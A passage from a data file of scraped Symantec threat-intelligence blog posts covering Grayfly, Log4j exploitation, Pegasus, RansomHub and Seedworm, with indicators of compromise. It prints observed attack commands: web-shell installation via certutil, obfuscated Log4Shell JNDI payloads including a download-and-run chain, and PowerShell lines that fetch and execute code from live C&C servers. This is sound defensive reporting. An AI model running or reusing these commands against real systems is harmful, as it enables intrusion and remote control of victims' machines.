comprehensive remote access to the network and proxy connections allowing them to access hard-to-reach segments of a target's network.\nAlthough sometimes labeled APT41, we consider Grayfly the espionage arm of APT41.\nSimilarly, Symantec tracks other sub-groups of APT41 separately, such as Blackfly, its cyber-crime arm.\nSidewalk campaign A characteristic of the recent campaign was that the group appeared to be particularly interested in attacking exposed Microsoft Exchange or MySQL servers.\nThis suggests that the initial vector may be the exploit of multiple vulnerabilities against public-facing servers.\nIn at least one attack, the suspicious Exchange activity was followed by PowerShell commands used to install an unidentified web shell.\nFollowing this, the malicious backdoor was executed.\nAfter the installation of the backdoor, the attackers deployed a custom version of the credential-dumping tool Mimikatz.\nThis version of Mimikatz has been used previously in Grayfly attacks.\nVictim case study The first indication of attacker activity was identified at 20:39 local time, where a Base64-encoded PowerShell command was executed via a legitimate Exchange Server-related process.\nThe command was used to execute certutil to decode and install a web shell: >(^_certutil -decode -f C:\\Windows\\Temp\\ImportContactList_-.aspx C:\\Windows\\Temp\\ImportContactList.aspx;if((dir C:\\Windows\\Temp\\ImportContactList.aspx).Length -eq 212){Remove-Item -Force C:\\Windows\\Temp\\ImportContactList_*-*.aspx}* Next, another Base64-encoded PowerShell command was executed.\nThis command was used to move the web shell to the Exchange install path, accessible by the attackers – specifically the ClientAccess\\ecp directory. -\nmv C:\\Windows\\Temp\\ImportContactList.aspx $envExchangeInstallPath\\ClientAccess\\esp\\ -Force Several minutes later, a backdoor was executed via installutil.exe: - CSIDL_WINDOWS\\microsoft.net\\framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /ParentProc=none /U CSIDL_WINDOWS\\microsoft.net\\framework64\\v4.0.30319\\microsoft.webapi.config Roughly an hour later, the attackers were observed executing a WMIC command in order to run a Windows batch file.\nThis file was used to create a scheduled task to execute the backdoor and ensure persistence: - WMIC /NODE:\"172.16.140.234\" process call create \"cmd.exe /c c:\\users\\public\\schtask.bat\" Shortly after this, Mimikatz was executed to dump credentials: - sha2:b3eb783b017da32e33d19670b39eae0b11de8e983891dd4feb873d6e9333608d (Mimikatz) - csidl_system_drive\\perflogs\\ulsassx64.exe After this point, no further activity was observed.\nIndictments Three Chinese men were indicted in the U.S. in 2020 for their involvement in attacks that involved Grayfly tools and tactics.\nAt the time of the indictment, Jiang Lizhi, Qian Chuan, and Fu Qiang were based in the Chinese city of Chengdu and held senior positions in a company called Chengdu 404.\nThe company describes itself as a network security specialist and claims to employ a team of white hat hackers who can perform penetration testing along with other security operations.\nThe indictment charged the men with involvement in attacks against over 100 different organizations in the U.S., South Korea, Japan, India, Taiwan, Hong Kong, Malaysia, Vietnam, India, Pakistan, Australia, the United Kingdom, Chile, Indonesia, Singapore, and Thailand.\nJiang was said to have a “working relationship” with the Chinese Ministry of State Security which would provide him and his associates with a degree of state protection.\nLikely to continue Grayfly is a capable actor, likely to continue to pose a risk to organizations in Asia and Europe across a variety of industries, including telecommunications, finance, and media.\nIt's likely this group will continue to develop and improve its custom tools to enhance evasion tactics along with using commodity tools such as publicly available exploits and web shells to assist in their attacks.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise | SHA256 | Description | Detection | |---|---|---| | 1b5b37790b2029902d2d6db2da20da4d0d7846b20e32434f01b2d384eba0eded | Sidewalk loader | Trojan.\nGen.MBT | | b732bba813c06c1c92975b34eda400a84b5cc54a460eeca309dfecbe9b559bd4 | Sidewalk loader | Trojan.\nGen.MBT | | 04f6fc49da69838f5b511d8f996dc409a53249099bd71b3c897b98ad97fd867c | Sidewalk loader | Trojan.\nGen.MBT | | 25a7c1f94822dc61211de253ff0a5805a0eb83921126732a0d52b1f1967cf079 | Sidewalk loader | Trojan Horse | | b3eb783b017da32e33d19670b39eae0b11de8e983891dd4feb873d6e9333608d | Mimikatz | Hacktool.\nMimikatz | Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":48,"metadata":{"source":"blog","platform":"symantec","filename":"Grayfly"}}
{"id":140,"title":"Log4j Vulnerabilities: Attack Insights | Symantec Enterprise Blogs","publish_date":null,"link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/log4j-vulnerabilities-attacks","clean_text":"Log4j Vulnerabilities: Attack Insights Symantec data shows variation and scope of attacks.\nApache Log4j is a Java-based logging utility.\nThe library’s main role is to log information related to security and performance to make error debugging easier and to enable applications to run smoothly.\nThe library is part of the Apache Logging Services, a project of the Apache Software Foundation.\nLog4j has been making headlines recently after the public disclosure of three critical vulnerabilities in the utility which can lead to remote code execution (CVE-2021-44228 and CVE-2021-45046) and denial of service (CVE-2021-45105).\nThe initial remote code execution vulnerability (CVE-2021-44228) has been dubbed Log4Shell and has dominated cyber-security news ever since it was publicly disclosed on December 9.\nThe vulnerability has been exploited to deploy a plethora of payloads like coin miners, Dridex malware, and even ransomware such as Conti.\nVariations in attacks Symantec, a division of Broadcom Software, has observed numerous variations in attack requests primarily aimed at evading detection.\nSome sample attack requests can be seen in Table 1.\n| Attack requests | |---| | ${jndi:ldap://:1389/Exploit} | | ${jndi:dns://MASKED_IP.1/securityscan-http8085} | | ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//MASKED_IP:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}') | | ${${lower:${lower:jndi}}:${lower:rmi}://MASKED_IP:1389/Binary} | | ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://MASKED_IP:1389/Binary} | | ${${::-j}${::-n}d${::-i}:${::-l}${::-d}${::-a}${::-p}://${::-1}${::-5}${::-9}.${::-2}${::-2}MASKED_IP:44${::-3}/${::-o}=${::-t}omca${::-t}} | Attackers are predominantly using the LDAP and RMI protocols to download malicious payloads.\nWe have also recorded vulnerability scans using protocols such as IIOP, DNS, HTTP, NIS etc.\nPayloads Muhstik Botnet - We have observed attackers downloading malicious Java class files as a part of Log4shell exploitation.\nThe malicious class file downloads a shell file with the content shown in Figure 1.\nThe shell script attempts to download Executable and Linkable Format (ELF) files and execute them, which leads to the installation of the Muhstik botnet.\nXMRig miner - We have also observed attackers installing the XMRig cryptocurrency miner as a part of post-exploitation activity related to Log4shell exploitation.\nThe miner is downloaded via a simple PowerShell command (Figure 2).\nThe miner is executed with the command shown in Figure 3.\nMalicious class file backdoor - We have also seen attacks attempt to download a malicious Java class file that acts as a backdoor.\nThe class file has code to listen for and execute commands from the attacker (Figure 4).\nReverse Bash shell – Attackers were also observed deploying reverse shells on vulnerable machines (Figure 5).\nOther publicly reported payloads include the Khonsari and Conti ransomware threats, the Orcus remote access Trojan (RAT), and the Dridex malware, among others.\nSymantec IPS data For the period between December 9 (when the first Log4j vulnerability was disclosed) and December 21, Symantec’s Intrusion Prevention System (IPS) blocked more than 93 million Log4Shell related exploitation attempts on more than 270,000 unique machines.\nDuring the same time frame, IPS blocked more than 18 million Log4Shell related exploitation attempts on more than 60,000 unique server machines.\nThe majority of Log4Shell attacks blocked by Symantec were against machines located in the U.S. and the United Kingdom, followed by Singapore, India, and Australia.\nMeanwhile, the majority of attacks exploiting the Log4j vulnerabilities seem to originate from devices located in the U.S. and Germany, followed by Russia, the United Kingdom, and China.\nProtection Behavior-based - SONAR.Maljava!g7 - SONAR.Ransomware!g1 - SONAR.Ransomware!g31 - SONAR.Ransomware!g32 - SONAR.SuspLaunch!g184 - SONAR.SuspLaunch!g185 File-based - CL.Suspexec!gen106 - CL.Suspexec!gen107 - CL.Suspexec!gen108 - Linux.\nKaiten - Miner.\nXMRig!gen2 - Ransom.\nKhonsari - Ransom.\nTellyouthepass - Ransom.\nTellyouthepa!g1 - Ransom.\nTellyouthepa!g2 - Trojan Horse - Trojan.\nMaljava Machine learning-based - Heur.\nAdvML.C Network-based - Audit: Suspicious Java Class File Executing Arbitrary Commands - Audit: Log4j2 RCE CVE-2021-44228 - Audit: Malicious LDAP Response - Attack: Log4j2 RCE CVE-2021-44228 2 - Attack: Malicious LDAP Response - Attack: Log4j2 RCE CVE-2021-44228 - Attack: Log4j CVE-2021-45046 - Attack: Log4j CVE-2021-45105 - Web Attack: Malicious Java Payload Download 2 - Web Attack: Malicious Java Payload Download 3 - Web Attack: Malicious Java Payload Download 4 Policy-based DCS provides multi-layered protection for Windows, Linux Server workloads, and container applications for this vulnerability: - Suspicious Process Execution: Prevention policies prevent malware from being dropped or executed on the system.\nDCS hardened Linux servers prevent execution of malware from temp or other writable locations, a technique used by attackers to drop crypto miners such as XMRig in reported Log4shell exploitation. -\nReview the Linux proxy execution list for your Log4j-based application sandbox to include additional tools such as */curl, */wget.\nThese tools are used by attackers to connect from the victim Log4j application to external command-and-control servers for downloading additional payloads. -\nDCS sandboxing of Windows and Linux applications prevent suspicious program execution using living-off-the-land tools and tampering of critical system services and resources. -\nNetwork Control: Ability to block outgoing connections to public internet and limit required LDAP, HTTP, and other traffic from server workloads and containerized applications using Log4j2 to internal trusted systems. -\nDetection Policies: System Attack detection: Baseline_WebAttackDetection_Generic_MaliciousUserAgent rule should be updated to include *jndi:* select string to alert on malicious server requests using the suspicious jndi lookup attempts via jndi:ldap, jndi:rmi, jndi:dns etc.\nMake sure to set the path to your web server access log file in the IDS Web Attack Detection option.\nSimilar custom text log rules should be added for each of your Log4j application log files.\nWant to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":44,"metadata":{"source":"blog","platform":"symantec","filename":"Log4j"}}
{"id":141,"title":"Pegasus Spyware Takes Flight Again | Symantec Enterprise Blogs","publish_date":"2021-02-28","link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/pegasus-forcedentry-protection","clean_text":"Pegasus Spyware Takes Flight Again Symantec solutions help detect, filter, and block the threat.\nThe recent iOS 14.8 update fixes a zero-day, zero-click exploit for a vulnerability affecting every mobile iOS device.\nThe flaw, dubbed FORCEDENTRY (CVE-2021-30860), resided in Apple’s iMessage and, according to a report by The Citizen Lab, was used to push NSO Group’s Pegasus spyware to mobile iOS devices dating back to as far as February 2021.\nPegasus has been around for some years now but has been back in the spotlight recently following reports from both The Citizen Lab and Amnesty International about the spyware targeting journalists, activists, and others.\nOne of the main concerns with FORCEDENTRY is that it can be used in what is called a zero-click attack, meaning it requires no user interaction.\nAn attacker exploiting the flaw only needs the Apple ID of a device in order to silently compromise it This post will cover what is currently known about the Pegasus threat, how common it is, and how Symantec, a part of Broadcom Software, is keeping its customers safe from the spyware.\nThe Pegasus Threat Developed by Israeli cyber arms firm NSO Group, Pegasus is a sophisticated and elusive mobile spyware that has been around for some years now.\nPegasus has the ability to read messages, track calls, track device location, collect passwords, and access the target device's microphone and camera.\nAccording to NSO Group, Pegasus is sold to nation-states and law enforcement to help in the fight against crime and terrorism, and to maintain public safety.\nDespite this statement, misuse of the software has been flagged over the years and Symantec has had a long-standing capability to detect it.\nA recent report uncovered attacks exploiting vulnerabilities in Apple's iMessage service in order to install Pegasus.\nThe attack only needs the Apple ID - an email or phone number - to infect the targeted mobile device.\nThe attack payload uses iMessage fields that are \"hidden\" from the user; in fact, if the iMessage text field is blank, no alerts or notifications are shown at all.\nThis type of iMessage zero-click attack dates back to iOS 11 and research done by the Google Project Zero team.\nThe payload exploits vulnerabilities in the iMessage framework, such as exploiting the PDF processor by sending a maliciously crafted PDF to achieve arbitrary code execution (fixed in the iOS 14.8 update).\nFurther, the attack execution takes place entirely inside the iMessage framework’s sandbox processes and is wiped when the device restarts.\nHow Common is the Threat?\nSuffice to say, this makes measuring the scope of the Pegasus threat challenging.\nThe best clue left behind by a FORCEDENTRY attack is the resulting web traffic it generates when it tries to download Pegasus spyware framework files.\nReports from Amnesty International listed known Pegasus infection URLs.\nWe ran that list against the Symantec WebPulse URL reputation service used by Symantec Endpoint Protection Mobile to identify and block suspect web traffic.\nWe found close to 1 in 150,000 iOS devices attempting to access a known Pegasus infection URL.\nWhile this number might seem low, this is only one part of the kill chain and the list of known infection URLs is by no means exhaustive.\nIn any case, Symantec WebPulse was able to identify the URLs as potential risks or malicious, and stop the infection and kill chain - even if it contained zero-day exploits and required zero user clicks - dead in its tracks.\nHow is Symantec Solving the Problem?\nSymantec Endpoint Protection Mobile analyzes links contained within SMS messages, shielding users from attacks by checking URLs (even those that might be hidden to the user) against the threat intelligence in Symantec WebPulse, part of the Symantec Global Intelligence Network.\nSymantec Endpoint Protection Mobile provides protection against network content threats, filtering and blocking communication to known command-and-control servers used in Pegasus campaigns (the same WebPulse global URL intelligence information is embedded in both our Windows and Mac Symantec Endpoint Protection agents).\nIt can also identify and protect vulnerable iOS & Android devices.\nFor more details around coverage see the Pegasus Spyware Protection Bulletin from the Symantec Security Center.\nPatches for FORCEDENTRY are available for macOS, iOS, iPadOS, and watchOS, and users are advised to apply these patches as soon as possible.\nConclusion Apple addressed the FORCEDENTRY vulnerability quickly with its iOS 14.8 update.\nHowever, with the iMessage framework increasingly a target for threat hunters, we expect many more fixes to come.\nWe also expect the number of attacks targeting iOS devices will follow similar attack patterns used by Pegasus.\nUnfortunately, with limited visibility into the attack payload and kill chain, attackers know they can easily evade detection.\nAll this highlights how important it is to have mobile endpoint protection as part of a layered network defense strategy to prevent known and unknown (zero-day) attacks targeting mobile devices.\nWant to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":37,"metadata":{"source":"blog","platform":"symantec","filename":"Pegasus"}}
{"id":142,"title":"RansomHub: Attackers Leverage New Custom Backdoor | Symantec Enterprise Blogs","publish_date":"2024-02-28","link":"https://www.security.com/threat-intelligence/ransomhub-betruger-backdoor","clean_text":"RansomHub: Attackers Leverage New Custom Backdoor Betruger backdoor being used by at least one affiliate of RansomHub.\nAt least one affiliate of the RansomHub ransomware-as-a-service (RaaS) has begun using a new custom backdoor in attacks.\nThe malware (Backdoor.\nBetruger) is a rare example of a multi-function backdoor, seemingly developed specifically for use in carrying out ransomware attacks.\nThe use of custom malware other than encrypting payloads is relatively unusual in ransomware attacks.\nMost attackers rely on legitimate tools, living off the land, and publicly available malware such as Mimikatz and Cobalt Strike.\nRansomware groups do on occasion develop custom tools, mostly for data exfiltration, such as the Coreid group’s Infostealer.\nExmatter or the Hecamede group’s Infostealer.\nExbyte.\nBetruger functionality Analysis of the Betruger backdoor revealed that it contained functionality that is usually found in multiple pre-ransomware tools.\nThis included: - Screenshotting - Keylogging - Uploading files to a command and control (C&C) server - Network scanning - Privilege escalation - Credential dumping File names used for versions of this malware included mailer.exe and turbomailer.exe.\nThe backdoor contains no mailing functionality.\nIt is possible the attackers used the name in order to masquerade as a legitimate application.\nThe functionality of Betruger indicates that it may have been developed in order to minimize the number of new tools dropped on a targeted network while a ransomware attack is being prepared.\nOther tools Betruger is just one of a range of tools that have been used by RansomHub affiliates in recent months.\nLike a growing number of ransomware attackers, some have begun using tools that leverage the Bring Your Own Vulnerable Driver (BYVOD) technique to disable security solutions, most notably EDRKillshifter.\nAttackers also leveraged several vulnerabilities, including a Windows Privilege Escalation exploit (CVE-2022-24521) and a Veeam exploit that leaks credentials for backups (CVE-2023-27532).\nOther tools leveraged in recent attacks include: - Impacket: An open-source collection of modules written in Python for programmatically constructing and manipulating network protocols.\nImpacket contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks. -\nStowaway Proxy Tool: A publicly available multi-hop proxy tool that allows users to easily proxy their network traffic to intranet nodes. -\nRclone: An open-source tool that can legitimately be used to manage content in the cloud, but has been seen being abused by ransomware actors to exfiltrate data from victim machines. -\nScreenConnect: A remote desktop application tool by ConnectWise, used to enable remote access to computers. -\nMimikatz: A publicly available credential dumping tool. -\nSystemBC: Commodity malware that can open a backdoor on the infected computer and use the SOCKS5 proxy protocol to communicate with a C&C server. -\nNetScan: SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for the discovery of host names and network services. -\nAtera: Legitimate remote monitoring and access software.\nIt and similar tools are often used by attackers to obtain remote access to computers on a network. -\nSplashtop: A family of legitimate remote desktop software and remote support software developed by Splashtop Inc. Enables users to remotely access computers from desktop and mobile devices. -\nTightVNC: Open-source remote desktop software.\nUp-and-coming threat The Betruger backdoor was deployed in several recent RansomHub attacks, suggesting that it is available to at least one affiliate.\nRansomHub is a RaaS operation run by a cybercrime group Symantec calls Greenbottle.\nActive since February 2024, Greenbottle has quickly grown RansomHub, becoming the most prolific ransomware operation by the third quarter of 2024, responsible for the highest number of claimed attacks.\nThe group has reportedly won over many affiliates by offering them better terms compared to rival operations, such as a great percentage of ransom payments and a payment model where the affiliate is paid by the victim before passing on the operator’s cut.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\n| IOC | Description | |---|---| | ae7c31d4547dd293ba3fd3982b715c65d731ee07a9c1cc402234d8705c01dfca | Betruger | | b058c128c801e2ee03874e183239ff369c599f3a2324905ff73f99d16d3b1a16 | Betruger | | 9e0a89c1b98f448865a73049a2b90bdfcd1b9846c4506441cfa6f0e429c1b329 | RansomHub | | 0ad9ab7aa9ecbc79bca0bfce5be58e0aa2606bdab3898daac43a6fa1231af164 | RansomHub | | 290b3fe64fd0875b2dc6bc0ad77dd52a70ad91a81dc24220523d38bf6c538afa | RansomHub | | 35e853cc67bf1869127ed341ea7b1a5cbf7032523288d514dc4685924f898db2 | RansomHub | | 9e0274c4e57381e97ccceadba37b64da35cfc379f80abc53e40f310a5e6b690b | RansomHub | | a46c3639ba099953def013430063ea018f616c10e4b1cb4fe9a26d261f9dab0d | RansomHub | | bd82216f1341159e950e9e7a68015c54c4995c8fd7c12c28a839c5068b0919ad | RansomHub | | df4c29cce2cf1a158ed0cefc860dc54f6fbb9bdafdc3bf5af60b506f78e69e4f | RansomHub | | 6d215534002fe7627763f5dd971d529d2f2186431244108d1fd8b5e9e2c9a3b2 | RansomHub | | 2d4fa520c03b358223d8210f2e9bad572e4914efd6e70cb7db85a377e891e69a | RansomHub | | 24be73b64509dbad476b2873edf500554fed5885826b21e2f538993900d9a364 | RansomHub | | 84099559a6d1dd1fec8a5c065da9f0747fab8ebb7368c197224fa33035eabe8d | RansomHub | | 3c9f0907304f7af7a7b88f931b6733698e86492d02e98e440e87e3ffe2153dbc | RansomHub | | c4d51f5a4dc95b0ac4b4f44a74d282d84898ddf56293a7dfddd5cb5eb90ec989 | RansomHub | | 262a4dff66ceb25d35d5ca8d8d148c1fee88ea2ee1187877a5a0c8d6a0dd24b5 | RansomHub | | de4d1f58fa8fa9eb156a37a8d9a3396d58e804f92e5eee25878a36a116f66362 | RansomHub | | ab84aeee213b902fde9740c466cd53af4bae6d5ea81a2b84c4d534b08b2fa049 | RansomHub | | 1f1d3587e458dd883f9ca282fbf559115334a993ba111ec2296e94de8a6fab83 | EDRkillshifter | | 6af2283337104fac154c26c7c55f274f4c36a231497af96f414897dfbeb6691c | SystemBC | | 76964c6e8283101383a5a99f7a0bd8a7c170e44752a73ce034558c43a19207af | Rclone batch file | | a8806944ff6cad0d45d956972c32e93f44da7e251352d63c1f058df8384b78d1 | Rclone batch file | | aaa647327ba5b855bedea8e889b3fafdc05a6ca75d1cfd98869432006d6fecc9 | Rclone | | 8dc79c12fe1e8aefb870049c16fd1d62051207310702b99428cd73987e299ca3 | CVE-2022-24521 exploit | | 05633246aeee0959414cf3b4d5482df728cb798b838963270cf416783ef0db7b | CVE-2023-27532 exploit | | cf87a44c575d391df668123b05c207eef04b91e54300d1cbbec2f48f5209d4a4 | CVE-2023-27532 exploit | | 57f58fd5c140fd86fda11c8f7aae1b53479e1510fbcabe7bee795dc01929285c | CVE-2023-27532 exploit | | a96a0ba7998a6956c8073b6eff9306398cc03fb9866e4cabf0810a69bb2a43b2 | Atera | | 9fa315259cc627b17a0d99864cd1bf54667bd26ccef5ce50ba412fa8911b10e5 | Atera | | d37a023b809ef9ec024be3976344813a4b860aa9104e298d5d5d4805381ff3a5 | NetScan | | e14ba0fb92e16bb7db3b1efac4b13aee178542c6994543e7535d8efaa589870c | NetScan | | 7c0f223f585b9c9b64d4ac8c04724edbffa43b95fa997912960c9c5332ede18b | Mimikatz | | d04bd76a2710fc35b3a445b5db241f13f199763e38b8fbe5316063c36a27a931 | Mimikatz | | 41abfef1ac0b9700700a9b42cb39cdd79b39a1a5b0eb3d3929e82c650b84bac6 | Mimikatz | | c3405d9c9d593d75d773c0615254e69d0362954384058ee970a3ec0944519c37 | Secretsdump | | 80a2ae9d5189c55aeb838b651a712e70045d8e45bd95678c61109e6183fe3607 | ScreenConnect | | edc9222aece9098ad636af351dd896ffee3360e487fda658062a9722edf02185 | Stowaway Proxy Tool | | f402d9eb5158adac54ab9f4f564051a39a8d817dd66bd46bbb373e80f08a4a08 | Splashtop | | 5f08f5d3732bc019c80277ab6d8d4a4bd49709958e7a1ee8879ddcea21751cbb | CVE-2023-27532 exploit | | 32d8971ce5d541b1eb8863ea66dfd1aee0cb9fdaeb47990991ed301912bffa78 | Unknown VBS file | | 67d99f3afaa21d470f354dade1fa19320cc36d51e7023be64d4daa25af6f5def | Unknown file | | 6ff9eac3b4272e81a3b89f709fba4dba6544db22e72dcb114ba27e10970420ad | Unknown file | | f9c5d479ead9d36af0dc3389774fa2af85d490d93ff91620b1f9390783247cae | Unknown file | | 3d7658c7db34650db12f11c0f2621c08a80aa0ffb5443a944519b4da0236e446 | Unknown file | | 03fec698a64c49f2650b064f0ba61266b22cae4a8eb8e07959bfc07c9180b905 | Unknown file | | 91c8b02b1fa9d1d555b56e50b091d4c5493b907e18b794f3280682d8d30b96f3 | Unknown file | | 494123779a6edf73807f549b6cd1bffd3bfd660dacb027af66600eaad66f8fb1 | Unknown file | | 7985fbd052906a1cd963d42987ac5c840ddbf920b6c9b274aa5f428021830902 | Unknown file | | 7d7d6c292c05920d8272960c62acb8ab5c000f4c6cf3ed9f5e1edd70f7f33c91 | Unknown file | | 479c27daa3b3bc10de1cde10c54d62f71eed0cb922d32b58fa4083204fecc050 | Unknown file | | 90b9a10809bae2db28b585f9a4fc5f40f474b76db7aa936d2059a1244f955908 | Unknown file | | aaf985a5817a693f92a2775ce65ef57ddd2425b38533ec95062940d475c5568d | Unknown file | Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":37,"metadata":{"source":"blog","platform":"symantec","filename":"RansomHub"}}
{"id":143,"title":"Seedworm: Iranian Hackers Target Telecoms Orgs in North and East Africa | Symantec Enterprise Blogs","publish_date":"2023-11-28","link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/iran-apt-seedworm-africa-telecoms","clean_text":"Seedworm: Iranian Hackers Target Telecoms Orgs in North and East Africa MuddyC2Go framework and custom keylogger used in attack campaign.\nIranian espionage group Seedworm (aka Muddywater) has been targeting organizations operating in the telecommunications sector in Egypt, Sudan, and Tanzania.\nSeedworm has been active since at least 2017, and has targeted organizations in many countries, though it is most strongly associated with attacks on organizations in the Middle East.\nIt has been publicly stated that Seedworm is a cyberespionage group that is believed to be a subordinate part of Iran’s Ministry of Intelligence and Security (MOIS).\nThe attackers used a variety of tools in this activity, which occurred in November 2023, including leveraging the MuddyC2Go infrastructure, which was recently discovered and documented by Deep Instinct.\nResearchers on Symantec’s Threat Hunter Team, part of Broadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated.\nThe attackers also use the SimpleHelp remote access tool and Venom Proxy, which have previously been associated with Seedworm activity, as well as using a custom keylogging tool, and other publicly available and living-off-the-land tools.\nAttack Chain The attacks in this campaign occurred in November 2023.\nMost of the activity we observed occurred on one telecommunications organization.\nThe first evidence of malicious activity was some PowerShell executions related to the MuddyC2Go backdoor.\nA MuddyC2Go launcher named “vcruntime140.dll” was saved in the folder “csidl_common_appdata\\javax”, which seems to have been sideloaded by jabswitch.exe.\nJabswitch.exe is a legitimate Java Platform SE 8 executable.\nThe MuddyC2Go launcher executed the following PowerShell code to connect to its command-and-control (C&C) server: tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=\"tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp\";$uri =\"http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf\";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.\nContent; It appears that the variables at the beginning of the code are there for the purposes of attempting to bypass detection by security software, as they are unused and not relevant.\nRight after this execution, attackers launched the MuddyC2Go malware using a scheduled task that had previously been created: \"CSIDL_SYSTEM\\schtasks.exe\" /run /tn \"Microsoft\\Windows\\JavaX\\Java Autorun\" The attackers also used some typical commands related to the Impacket WMIExec hacktool: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1698662615.0451615 2>&1 The SimpleHelp remote access tool was also leveraged, connecting to the 146.70.124[.]102 C&C server.\nFurther PowerShell stager execution also occurred, while the attacker also executed the Revsocks tool: CSIDL_COMMON_APPDATA\\do.exe -co 94.131.3.160:443 -pa super -q The attackers also used a second legitimate remote access tool, AnyDesk, which was deployed on the same computer as Revsocks and SimpleHelp, while PowerShell executions related to MuddyC2Go also occurred on the same machine: $uri =\"http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT\";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.\nContent; Notably, this organization is believed to have previously been infiltrated by Seedworm earlier in 2023.\nThe primary activity of note during that intrusion was extensive use of SimpleHelp to carry out a variety of activity, including: - Launching PowerShell - Launching a proxy tool - Dumping SAM hives - Using WMI to get drive info - Installing the JumpCloud remote access software - Delivering proxy tools, a suspected LSASS dump tool, and a port scanner.\nDuring that intrusion, it’s believed the attackers used WMI to launch the SimpleHelp installer on the victim network.\nAt the time, this activity couldn’t be definitively linked to Seedworm, but this subsequent activity appears to show that the earlier activity was carried out by the same group of attackers.\nIn another telecommunications and media company targeted by the attackers, multiple incidents of SimpleHelp were used to connect to known Seedworm infrastructure.\nA custom build of the Venom Proxy hacktool was also executed on this network, as well as the new custom keylogger used by the attackers in this activity.\nIn the third organization targeted, Venom Proxy was also used, in addition to AnyDesk and suspicious Windows Scripting Files (WSF) that have been associated with Seedworm activity in the past.\nToolset The most interesting part of the toolset used in this activity is probably the presence of the MuddyC2Go launcher, which was sideloaded by jabswitch.exe.\nThe malware reads the C&C URL from the Windows registry value “End” stored inside the key “HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip”.\nThe URL path is read from the “Status” value in the same aforementioned key.\nLastly, the MuddyC2GO launcher executes the following PowerShell command to contact its C&C server and execute the PowerShell code received: powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.\nContent;iex $response.\nContent; The MuddyC2Go framework was first publicly written about in a blog published by Deep Instinct researchers on November 8, 2023.\nThat blog documented its use in attacks on organizations in countries in the Middle East.\nThe researchers said the framework may have been used by Seedworm since 2020.\nThey also said that the framework, which is written in Go, has replaced Seedworm’s previous PhonyC2 C&C infrastructure.\nThis replacement appears to have occurred after the PhonyC2 source code was leaked earlier in 2023.\nThe full capabilities of MuddyC2Go are not yet known, but the executable contains an embedded PowerShell script that automatically connects to Seedworm’s C&C server, which eliminates the need for manual execution by an operator and gives the attackers remote access to a victim machine.\nDeep Instinct said it was able to link MuddyC2Go to attacks dating back to 2020 due to the unique URL patterns generated by the framework.\nIt also said that the MuddyC2Go servers it observed were hosted at “Stark Industries”, which is a VPS provider that is known to host malicious activity.\nOther tools of note used in this activity included SimpleHelp, which is a legitimate remote device control and management tool, for persistence on victim machines.\nSimpleHelp is believed to have been used in attacks carried out by Seedworm since at least July 2022.\nOnce installed on a victim device, SimpleHelp can constantly run as a system service, which makes it possible for attackers to gain access to the user’s device at any point in time, even after a reboot.\nSimpleHelp also allows attackers to execute commands on a device with administrator privileges.\nSimpleHelp is now strongly associated with Seedworm activity and the tool is installed on several of Seedworm’s servers.\nVenom Proxy is a publicly available tool that is described as “a multi-hop proxy tool developed for penetration testers.”\nIt is written in Go.\nIt can be used to easily proxy network traffic to a multi-layer intranet, and easily manage intranet nodes.\nIt has been associated with Seedworm since at least mid-2022, with Microsoft describing it as Seedworm’s “tool of choice” in an August 2022 blog.\nSeedworm tends to use a custom build of Venom Proxy in its activity.\nOther tools used in this activity include: - Revsocks - A cross-platform SOCKS5 proxy server program/library written in C that can also reverse itself over a firewall. -\nAnyDesk - A legitimate remote desktop application.\nIt and similar tools are often used by attackers to obtain remote access to computers on a network. -\nPowerShell - Seedworm makes heavy use of PowerShell, as well as PowerShell-based tools and scripts in its attacks.\nPowerShell is a Microsoft scripting tool that can be used to run commands, download payloads, traverse compromised networks, and carry out reconnaissance. -\nCustom keylogger Conclusion Seedworm has long had an interest in telecommunications organizations, as do many groups engaged in cyberespionage activities.\nHowever, its strong focus on African organizations in this campaign is notable as, while it has been known to target organizations in Africa in the past, it does generally primarily focus on organizations in countries in the Middle East.\nThat one of the victim organizations in this campaign is based in Egypt is also of note given Egypt’s proximity to Israel, a frequent target of Seedworm.\nSeedworm appears to remain focused on using a wide array of living-off-the-land and publicly available tools in its attack chains, no doubt in an effort to remain undetected on victim networks for as long as possible.\nHowever, its recent more wide adoption of new C&C infrastructure in the form of MuddyC2Go is notable and shows that the group continues to innovate and develop its toolset when required in order to keep its activity under the radar.\nWhile the group uses a 